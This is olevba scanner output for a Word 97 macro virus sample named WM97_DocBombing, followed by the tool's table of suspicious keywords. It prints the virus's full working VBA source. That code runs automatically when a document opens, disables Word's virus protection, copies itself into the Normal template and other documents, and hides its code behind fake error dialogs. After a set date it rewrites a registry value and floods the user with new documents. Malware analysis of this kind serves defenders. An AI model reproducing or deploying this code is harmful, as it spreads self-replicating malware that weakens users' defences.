olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Db-37c45e194d19007eafcc3136fa83c9e11feba8e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO WM97_DocBombing.cls 
in file: Virus.MSWord.Db-37c45e194d19007eafcc3136fa83c9e11feba8e5 - OLE stream: 'Macros/VBA/WM97_DocBombing'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Dim ToInfectNT As Boolean, ToInfectAD As Boolean
Dim Bcl As Integer, NTCL As Integer, ADCL As Integer

Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NT.CodeModule.CountOfLines
ADCL = AD.CodeModule.CountOfLines

Options.SaveNormalPrompt = False
Options.VirusProtection = False

If (NT.Name) <> "WM97_DocBombing" Then
    NT.CodeModule.DeleteLines 1, NTCL
    ToInfectNT = True
    NT.Name = "WM97_DocBombing"
End If

If (AD.Name) <> "WM97_DocBombing" Then
    AD.CodeModule.DeleteLines 1, ADCL
    ToInfectAD = True
    AD.Name = "WM97_DocBombing"
End If

If (ToInfectNT = True And ToInfectAD = False) Then
    NT.CodeModule.InsertLines 1, "Private Sub Document_Close()"
    For Bcl = 2 To ADCL
        NT.CodeModule.InsertLines Bcl, AD.CodeModule.Lines(Bcl, 1)
    Next Bcl
    NT.CodeModule.InsertLines Bcl + 1, "Public Sub ViewVBCode()"
    NT.CodeModule.InsertLines Bcl + 2, "MsgBox " + """" + "This program has performed an illegal operation and will shut down." + """" + ", vbCritical, " + """" + "Microsoft Visual Basic" + """"
    NT.CodeModule.InsertLines Bcl + 3, "End Sub"
    
    NT.CodeModule.InsertLines Bcl + 4, "Public Sub ToolsMacro()"
    NT.CodeModule.InsertLines Bcl + 5, "MsgBox " + """" + "This program has performed an illegal operation and will shut down." + """" + ", vbCritical, " + """" + "Microsoft Word" + """"
    NT.CodeModule.InsertLines Bcl + 6, "End Sub"
End If

If (ToInfectNT = False And ToInfectAD = True) Then
    AD.CodeModule.InsertLines 1, "Private Sub Document_Open()"
    For Bcl = 2 To NTCL - 6
        AD.CodeModule.InsertLines Bcl, NT.CodeModule.Lines(Bcl, 1)
    Next Bcl
End If


If (Day(Now()) >= 6) Then
    If (Month(Now()) >= 11) Then
        If (Year(Now()) >= 2000) Then
            ActiveDocument.Windows.Application.Caption = "WM97_DocBombing virii !!"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Vortex!!"
            With ActiveDocument.Comments(1)
                .Author = "WM97_DocBombing"
                .Initial = "WM97_DB"
            End With
            For Bcl = 0 To 20
                Documents.Add
            Next Bcl
        End If
    End If
End If

'*** WM97_DocBombing Macro Virus ver1.2.03 by Vortex***
'Dedicasse au Condor (on est tous avec toi, Kevin !!!)
'Remerciements egalement a Kwyjibo pour l'excellente macro 'Melissa'
'Enjoy !!
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

